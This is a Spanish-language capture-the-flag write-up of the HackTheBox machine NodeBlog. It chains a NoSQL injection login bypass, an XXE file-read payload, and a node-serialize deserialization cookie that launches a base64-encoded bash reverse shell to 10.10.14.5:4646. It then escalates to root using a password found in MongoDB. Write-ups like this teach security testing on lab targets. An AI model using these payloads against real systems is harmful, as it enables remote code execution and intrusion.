---
layout: single
title: NodeBlog - HackTheBox
excerpt: "En este writeup se documenta la explotación de la máquina NodeBlog en HackTheBox, destacando vulnerabilidades en NoSQL Injection, XML External Entity (XXE) y deserialización insegura en Node.js"
date: 2025-02-25
classes: wide
header:
  teaser: /assets/images/NodeBlog/NodeBlog.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
tags:  
  - NoSQL Injection
  - XXE
  - Deserialización
---

![](/assets/images/NodeBlog/NodeBlog.png){:style="max-width:450px;height:auto;"}

## Resumen

En este writeup se documenta la explotación de la máquina NodeBlog en HackTheBox. La máquina presenta múltiples vulnerabilidades, incluyendo inyección NoSQL, inclusión de entidades externas XML (XXE) y deserialización insegura en Node.js, que permiten obtener acceso al sistema y escalar privilegios hasta root.

## Reconocimiento

El servidor expone los siguientes servicios:

- SSH en el puerto 22

- Servicio web en el puerto 5000

Realizamos un escaneo de puertos con nmap para identificar los servicios disponibles, también ejecutamos scripts básicos de reconocimiento con nmap:

![](/assets/images/NodeBlog/Reconocimiento-Puertos.png)

## Página Web

El servicio web en el puerto 5000 muestra un blog con una página de inicio de sesión vulnerable a NoSQL Injection.

![](/assets/images/NodeBlog/Web.png)

![](/assets/images/NodeBlog/Web-Login.png)

Al interceptar la petición de inicio de sesión con BurpSuite, vemos que permite autenticarse mediante inyección NoSQL.

![](/assets/images/NodeBlog/NoSQL.png)

## Reverse Shell

Utilizando BurpSuite, capturamos la cookie de sesión del usuario admin.

![](/assets/images/NodeBlog/NoSQL-Cookie.png)

Al ingresar la cookie en el navegador o realizar la petición con BurpSuite, accedemos como administrador:

![](/assets/images/NodeBlog/Inicio-Sesion-Admin.png)

La aplicación permite subir archivos XML. Exploramos la vulnerabilidad XXE (XML External Entity) creando un archivo XML que lea el contenido de /opt/blog/server.js, ruta identificada en las respuestas del servidor durante la inyección NoSQL.

    <?xml version="1.0"?>
    <!DOCTYPE data [
        <!ENTITY file SYSTEM "file:///opt/blog/server.js">
    ]>
    <post>
    <title>LFI Post</title>
    <description>Read File</description>
    <markdown>&file;</markdown>
    </post>

Al subirlo, obtenemos el código fuente de server.js.

![](/assets/images/NodeBlog/Funcion-Deserializar-Cookie.png)

Aquí observamos que la función authenticated deserializa la cookie de sesión sin validación, permitiendo la ejecución de código arbitrario.

## Exploit de Deserialización en Node.js

Generamos una payload para una reverse shell:

    echo "bash -i >& /dev/tcp/10.10.14.5/4646 0>&1" | base64 -w 0; echo

Resultado:

    YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ2NDYgMD4mMQo=

Generamos una cookie maliciosa:

    {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ2NDYgMD4mMQo= | base64 -d | bash',function(error, stdout, stderr) { console.log(stdout) });}()"}

Resultado (Cookie):

    %7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%20%28%29%7b%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%65%63%68%6f%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%31%4c%7a%51%32%4e%44%59%67%4d%44%34%6d%4d%51%6f%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%27%2c%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%20%7b%20%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%20%7d%29%3b%7d%28%29%22%7d

Iniciamos un listener con netcat, luego insertamos la cookie en la web:

![](/assets/images/NodeBlog/Reverse-Shell.png)

Obtenemos acceso a la máquina y encontramos la bandera 'user', se encuentra en el directorio 'home' del usuario 'admin':

![](/assets/images/NodeBlog/User-Flag.png)

## Escalada de Privilegios

Si miramos los puertos que están corriendo en el sistema, podemos ver que el puerto 27017 está activo, este puerto por defecto se suele utilizar para MongoDB:

![](/assets/images/NodeBlog/Puertos.png)

Ejecutamos Mongo y buscamos el usuario 'admin', ahí encontraremos una contraseña:

![](/assets/images/NodeBlog/Root-Pass.png)

Si intentamos iniciar sesión como el usuario privilegiado 'root' añadiendo esa contraseña, podremos iniciar sesión:

![](/assets/images/NodeBlog/Sudo-Su.png)

La bandera 'root' se encuentra en el directorio 'home' del usuario 'root':

![](/assets/images/NodeBlog/Root-Flag.png)

### Conclusión

La máquina NodeBlog de HackTheBox es un excelente ejemplo de cómo múltiples vulnerabilidades pueden encadenarse para lograr acceso y escalada de privilegios en un sistema. A través de la explotación de NoSQL Injection, logramos autenticarnos como administrador; con XXE, accedimos al código fuente de la aplicación; y finalmente, mediante deserialización insegura en Node.js, obtuvimos una reverse shell.

El análisis posterior de la base de datos MongoDB reveló credenciales que permitieron elevar privilegios a root, completando la explotación de la máquina. Este reto resalta la importancia de aplicar buenas prácticas de seguridad en el desarrollo web, como la validación de entradas, el uso seguro de la deserialización y la restricción de permisos en bases de datos.
